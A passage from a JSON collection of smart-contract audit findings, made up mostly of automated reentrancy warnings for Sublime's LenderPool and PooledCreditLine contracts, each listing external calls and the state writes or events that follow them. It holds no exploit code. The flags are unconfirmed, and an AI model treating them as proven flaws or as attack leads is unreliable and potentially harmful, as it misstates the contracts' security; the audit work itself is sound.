LenderPool._withdrawInterest(uint256,address) (contracts/PooledCreditLine/LenderPool.sol#429-445):\n\tExternal calls:\n\t- (_interestToWithdraw,_interestSharesToWithdraw) = _calculateInterestToWithdraw(_id,_lender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#433-438)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\tEvent emitted after the call(s):\n\t- InterestWithdrawn(_id,_lender,_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#444)\nReentrancy in LenderPool._withdrawLiquidation(uint256,uint256) (contracts/PooledCreditLine/LenderPool.sol#639-655):\n\tExternal calls:\n\t- IERC20(pooledCLConstants[_id].collateralAsset).safeTransfer(msg.sender,_lenderCollateralShare) (contracts/PooledCreditLine/LenderPool.sol#651)\n\tEvent emitted after the call(s):\n\t- LiquidationWithdrawn(_id,msg.sender,_lenderCollateralShare) (contracts/PooledCreditLine/LenderPool.sol#652)\nReentrancy in LenderPool._withdrawLiquidation(uint256,uint256) (contracts/PooledCreditLine/LenderPool.sol#639-655):\n\tExternal calls:\n\t- IERC20(pooledCLConstants[_id].collateralAsset).safeTransfer(msg.sender,_lenderCollateralShare) (contracts/PooledCreditLine/LenderPool.sol#651)\n\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\n\t\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/SafeERC20.sol#69)\n\t\t- IERC20(_borrowAsset).safeTransfer(msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#546)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\t\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,msg.sender,_sharesToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#565)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tExternal calls sending eth:\n\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\tEvent emitted after the call(s):\n\t- InterestWithdrawn(_id,_lender,_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#444)\n\t\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\n\t- TransferSingle(operator,account,address(0),id,amount) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#309)\n\t\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\n\t- WithdrawLiquidity(_id,msg.sender,_sharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#566)\n\t\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\n\t- WithdrawLiquidityOnCancel(_id,msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#547)\n\t\t- _withdrawLiquidity(_id,true) (contracts/PooledCreditLine/LenderPool.sol#654)\nReentrancy in LenderPool._withdrawLiquidity(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#524-572):\n\tExternal calls:\n\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t- IERC20(_borrowAsset).safeTransfer(msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#546)\n\tEvent emitted after the call(s):\n\t- WithdrawLiquidityOnCancel(_id,msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#547)\nReentrancy in LenderPool._withdrawLiquidity(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#524-572):\n\tExternal calls:\n\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t- (_interestWithdrawable,_interestSharesWithdrawable) = _calculateInterestToWithdraw(_id,msg.sender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#555-560)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,msg.sender,_sharesToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#565)\n\tEvent emitted after the call(s):\n\t- WithdrawLiquidity(_id,msg.sender,_sharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#566)\nReentrancy in LenderPool._withdrawLiquidity(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#524-572):\n\tExternal calls:\n\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t- IERC20(_borrowAsset).safeTransfer(msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#546)\n\t- (_interestWithdrawable,_interestSharesWithdrawable) = _calculateInterestToWithdraw(_id,msg.sender,_strategy,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#555-560)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,msg.sender,_sharesToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#565)\n\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tEvent emitted after the call(s):\n\t- InterestWithdrawn(_id,_lender,_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#444)\n\t\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\n\t- TransferSingle(operator,account,address(0),id,amount) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#309)\n\t\t- _burn(msg.sender,_id,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#571)\nReentrancy in LenderPool.lend(uint256,uint256) (contracts/PooledCreditLine/LenderPool.sol#281-304):\n\tExternal calls:\n\t- IERC20(_borrowAsset).safeTransferFrom(msg.sender,address(this),_amountToLend) (contracts/PooledCreditLine/LenderPool.sol#295)\n\t- _mint(msg.sender,_id,_amountToLend,) (contracts/PooledCreditLine/LenderPool.sol#296)\n\t\t- IERC1155ReceiverUpgradeable(to).onERC1155Received(operator,from,id,amount,data) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#380-388)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tEvent emitted after the call(s):\n\t- InterestWithdrawn(_id,_lender,_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#444)\n\t\t- _mint(msg.sender,_id,_amountToLend,) (contracts/PooledCreditLine/LenderPool.sol#296)\n\t- Lend(_id,msg.sender,_amount) (contracts/PooledCreditLine/LenderPool.sol#298)\n\t- TransferSingle(operator,address(0),account,id,amount) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#258)\n\t\t- _mint(msg.sender,_id,_amountToLend,) (contracts/PooledCreditLine/LenderPool.sol#296)\nReentrancy in LenderPool.liquidate(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#612-627):\n\tExternal calls:\n\t- (_collateralAsset,_collateralLiquidated) = POOLED_CREDIT_LINE.liquidate(_id) (contracts/PooledCreditLine/LenderPool.sol#617)\n\tEvent emitted after the call(s):\n\t- Liquidated(_id,_collateralLiquidated) (contracts/PooledCreditLine/LenderPool.sol#621)\nReentrancy in LenderPool.liquidate(uint256,bool) (contracts/PooledCreditLine/LenderPool.sol#612-627):\n\tExternal calls:\n\t- (_collateralAsset,_collateralLiquidated) = POOLED_CREDIT_LINE.liquidate(_id) (contracts/PooledCreditLine/LenderPool.sol#617)\n\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t\t- _status = POOLED_CREDIT_LINE.getStatus(_id) (contracts/PooledCreditLine/LenderPool.sol#525)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/SafeERC20.sol#69)\n\t\t- IERC20(_borrowAsset).safeTransfer(msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#546)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\t\t- IERC20(pooledCLConstants[_id].collateralAsset).safeTransfer(msg.sender,_lenderCollateralShare) (contracts/PooledCreditLine/LenderPool.sol#651)\n\t\t- _notBorrowedInShares = IYield(_strategy).getSharesForTokens(_notBorrowed,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#460)\n\t\t- SAVINGS_ACCOUNT.withdraw(_borrowAsset,_strategy,_lender,_interestToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#442)\n\t\t- _sharesToWithdraw = IYield(_strategy).getSharesForTokens(_amountToWithdraw,_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#562)\n\t\t- SAVINGS_ACCOUNT.withdrawShares(_borrowAsset,_strategy,msg.sender,_sharesToWithdraw,false) (contracts/PooledCreditLine/LenderPool.sol#565)\n\t\t- _interestToWithdraw = IYield(_strategy).getTokensForShares(_yieldInterestForLender.add(_borrowerInterestForLender),_borrowAsset) (contracts/PooledCreditLine/LenderPool.sol#497-500)\n\tExternal calls sending eth:\n\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\tEvent emitted after the call(s):\n\t- InterestWithdrawn(_id,_lender,_interestSharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#444)\n\t\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t- LiquidationWithdrawn(_id,msg.sender,_lenderCollateralShare) (contracts/PooledCreditLine/LenderPool.sol#652)\n\t\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t- TransferSingle(operator,account,address(0),id,amount) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC1155/ERC1155Upgradeable.sol#309)\n\t\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t- WithdrawLiquidity(_id,msg.sender,_sharesToWithdraw) (contracts/PooledCreditLine/LenderPool.sol#566)\n\t\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n\t- WithdrawLiquidityOnCancel(_id,msg.sender,_liquidityProvided) (contracts/PooledCreditLine/LenderPool.sol#547)\n\t\t- _withdrawLiquidation(_id,_lendingShare) (contracts/PooledCreditLine/LenderPool.sol#625)\n```\n\n```\nReentrancy in PooledCreditLine.repay(uint256,uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#976-1017):\n\tExternal calls:\n\t- _repaidInterestShares = IYield(pooledCreditLineConstants[_id].borrowAssetStrategy).getSharesForTokens(_interestPaid,pooledCreditLineConstants[_id].borrowAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#1006-1009)\n\t- _repaidShares = _repay(_id,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#1010)\n\t\t- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts/token/ERC20/SafeERC20.sol#69)\n\t\t- _sharesReceived = IYield(_strategy).getSharesForTokens(_amount,_borrowAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#1023)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\t\t- IERC20(_borrowAsset).safeTransferFrom(msg.sender,address(this),_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#1024)\n\t\t- IERC20(_borrowAsset).approve(_strategy,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#1025)\n\t\t- _savingsAccount.deposit(_borrowAsset,_strategy,lenderPool,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#1026)\n\t- ILenderPool(lenderPool).repaid(_id,_repaidShares,_repaidInterestShares) (contracts/PooledCreditLine/PooledCreditLine.sol#1011)\n\tExternal calls sending eth:\n\t- _repaidShares = _repay(_id,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#1010)\n\t\t- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts/utils/Address.sol#119)\n\tState variables written after the call(s):\n\t- pooledCreditLineVariables[_id].status = PooledCreditLineStatus.CLOSED (contracts/PooledCreditLine/PooledCreditLine.sol#1014)\nReentrancy in PooledCreditLine._borrow(uint256,uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#897-918):\n\tExternal calls:\n\t- require(bool,string)(_amount <= calculateBorrowableAmount(_id),B3) (contracts/PooledCreditLine/PooledCreditLine.sol#900)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _sharesWithdrawn = _withdrawBorrowAmount(_borrowAsset,pooledCreditLineConstants[_id].borrowAssetStrategy,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#905)\n\t\t- _shares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#961)\n\t\t- _savingsAccount.withdrawFrom(_asset,_strategy,lenderPool,address(this),_amountInTokens,false) (contracts/PooledCreditLine/PooledCreditLine.sol#962)\n\t- ILenderPool(lenderPool).borrowed(_id,_sharesWithdrawn) (contracts/PooledCreditLine/PooledCreditLine.sol#906)\n\tState variables written after the call(s):\n\t- updateStateOnPrincipalChange(_id,pooledCreditLineVariables[_id].principal.add(_borrowedAmount)) (contracts/PooledCreditLine/PooledCreditLine.sol#910)\n\t\t- pooledCreditLineVariables[_id].interestAccruedTillLastPrincipalUpdate = _totalInterestAccrued (contracts/PooledCreditLine/PooledCreditLine.sol#1225)\n\t\t- pooledCreditLineVariables[_id].lastPrincipalUpdateTime = block.timestamp (contracts/PooledCreditLine/PooledCreditLine.sol#1226)\n\t\t- pooledCreditLineVariables[_id].principal = _updatedPrincipal (contracts/PooledCreditLine/PooledCreditLine.sol#1227)\nReentrancy in PooledCreditLine._withdrawCollateral(uint256,bool) (contracts/PooledCreditLine/PooledCreditLine.sol#795-802):\n\tExternal calls:\n\t- _withdrawableCollateral = withdrawableCollateral(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#796)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_withdrawableCollateral,_toSavingsAccount) (contracts/PooledCreditLine/PooledCreditLine.sol#800)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\tState variables written after the call(s):\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_withdrawableCollateral,_toSavingsAccount) (contracts/PooledCreditLine/PooledCreditLine.sol#800)\n\t\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].sub(_amountInShares) (contracts/PooledCreditLine/PooledCreditLine.sol#846)\nReentrancy in PooledCreditLine.liquidate(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1077-1107):\n\tExternal calls:\n\t- currentCollateralRatio = calculateCurrentCollateralRatio(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1083)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _totalCollateral = calculateTotalCollateralTokens(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1084)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\tState variables written after the call(s):\n\t- pooledCreditLineVariables[_id].status = PooledCreditLineStatus.LIQUIDATED (contracts/PooledCreditLine/PooledCreditLine.sol#1100)\nReentrancy in PooledCreditLine.liquidate(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1077-1107):\n\tExternal calls:\n\t- currentCollateralRatio = calculateCurrentCollateralRatio(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1083)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _totalCollateral = calculateTotalCollateralTokens(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1084)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _collateralReceived = _transferCollateral(_id,_collateralAsset,_collateralToLiquidate,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1102)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\tState variables written after the call(s):\n\t- _collateralReceived = _transferCollateral(_id,_collateralAsset,_collateralToLiquidate,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1102)\n\t\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].sub(_amountInShares) (contracts/PooledCreditLine/PooledCreditLine.sol#846)\nReentrancy in PooledCreditLine.terminate(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1158-1165):\n\tExternal calls:\n\t- _allCollateral = calculateTotalCollateralTokens(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1159)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_allCollateral,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1160)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\tState variables written after the call(s):\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_allCollateral,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1160)\n\t\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].sub(_amountInShares) (contracts/PooledCreditLine/PooledCreditLine.sol#846)\n\t- delete pooledCreditLineConstants[_id] (contracts/PooledCreditLine/PooledCreditLine.sol#1162)\nReentrancy in PooledCreditLine.withdrawCollateral(uint256,uint256,bool) (contracts/PooledCreditLine/PooledCreditLine.sol#772-781):\n\tExternal calls:\n\t- _withdrawableCollateral = withdrawableCollateral(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#777)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_amount,_toSavingsAccount) (contracts/PooledCreditLine/PooledCreditLine.sol#779)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\tState variables written after the call(s):\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_amount,_toSavingsAccount) (contracts/PooledCreditLine/PooledCreditLine.sol#779)\n\t\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].sub(_amountInShares) (contracts/PooledCreditLine/PooledCreditLine.sol#846)\nReentrancy in PooledCreditLine._transferCollateral(uint256,address,uint256,bool) (contracts/PooledCreditLine/PooledCreditLine.sol#835-855):\n\tExternal calls:\n\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\tState variables written after the call(s):\n\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].sub(_amountInShares) (contracts/PooledCreditLine/PooledCreditLine.sol#846)\nReentrancy in PooledCreditLine.depositCollateral(uint256,uint256,bool) (contracts/PooledCreditLine/PooledCreditLine.sol#739-762):\n\tExternal calls:\n\t- _sharesDeposited = _savingsAccount.transferFrom(_collateralAsset,_strategy,msg.sender,address(this),_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#752)\n\t- IERC20(_collateralAsset).safeTransferFrom(msg.sender,address(this),_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#754)\n\t- IERC20(_collateralAsset).approve(_strategy,_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#755)\n\t- _sharesDeposited = _savingsAccount.deposit(_collateralAsset,_strategy,address(this),_amount) (contracts/PooledCreditLine/PooledCreditLine.sol#757)\n\tState variables written after the call(s):\n\t- depositedCollateralInShares[_id] = depositedCollateralInShares[_id].add(_sharesDeposited) (contracts/PooledCreditLine/PooledCreditLine.sol#759)\nReentrancy in PooledCreditLine.terminate(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1158-1165):\n\tExternal calls:\n\t- _allCollateral = calculateTotalCollateralTokens(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1159)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_allCollateral,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1160)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\tState variables written after the call(s):\n\t- delete pooledCreditLineVariables[_id] (contracts/PooledCreditLine/PooledCreditLine.sol#1161)\nReentrancy in PooledCreditLine.cancelRequest(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1143-1151):\n\tExternal calls:\n\t- ILenderPool(lenderPool).requestCancelled(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1149)\n\tEvent emitted after the call(s):\n\t- PooledCreditLineCancelled(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1150)\nReentrancy in PooledCreditLine.request(IPooledCreditLineDeclarations.Request) (contracts/PooledCreditLine/PooledCreditLine.sol#638-669):\n\tExternal calls:\n\t- _notifyRequest(_id,_request.lenderVerifier,_request.borrowAsset,_request.borrowAssetStrategy,_request.borrowLimit,_request.minBorrowAmount,_request.collectionPeriod,_request.areTokensTransferable) (contracts/PooledCreditLine/PooledCreditLine.sol#657-666)\n\t\t- ILenderPool(lenderPool).create(_id,_lenderVerifier,_borrowToken,_borrowAssetStrategy,_borrowLimit,_minBorrowedAmount,_collectionPeriod,_areTokensTransferable) (contracts/PooledCreditLine/PooledCreditLine.sol#703-712)\n\tEvent emitted after the call(s):\n\t- PooledCreditLineRequested(_id,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#667)\nReentrancy in PooledCreditLine.terminate(uint256) (contracts/PooledCreditLine/PooledCreditLine.sol#1158-1165):\n\tExternal calls:\n\t- _allCollateral = calculateTotalCollateralTokens(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1159)\n\t\t- _collateral = IYield(_strategy).getTokensForShares(_collateralShares,_collateralAsset) (contracts/PooledCreditLine/PooledCreditLine.sol#868)\n\t- _transferCollateral(_id,pooledCreditLineConstants[_id].collateralAsset,_allCollateral,false) (contracts/PooledCreditLine/PooledCreditLine.sol#1160)\n\t\t- _amountInShares = IYield(_strategy).getSharesForTokens(_amountInTokens,_asset) (contracts/PooledCreditLine/PooledCreditLine.sol#842)\n\t\t- _amountReceived = _savingsAccount.transferShares(_amountInShares,_asset,_strategy,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#849)\n\t\t- _amountReceived = _savingsAccount.withdrawShares(_asset,_strategy,msg.sender,_amountInShares,false) (contracts/PooledCreditLine/PooledCreditLine.sol#851)\n\t- ILenderPool(lenderPool).terminate(_id,msg.sender) (contracts/PooledCreditLine/PooledCreditLine.sol#1163)\n\tEvent emitted after the call(s):\n\t- PooledCreditLineTerminated(_id) (contracts/PooledCreditLine/PooledCreditLine.sol#1164)\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/37"
    }
  },
  {
    "title": "QA Report",
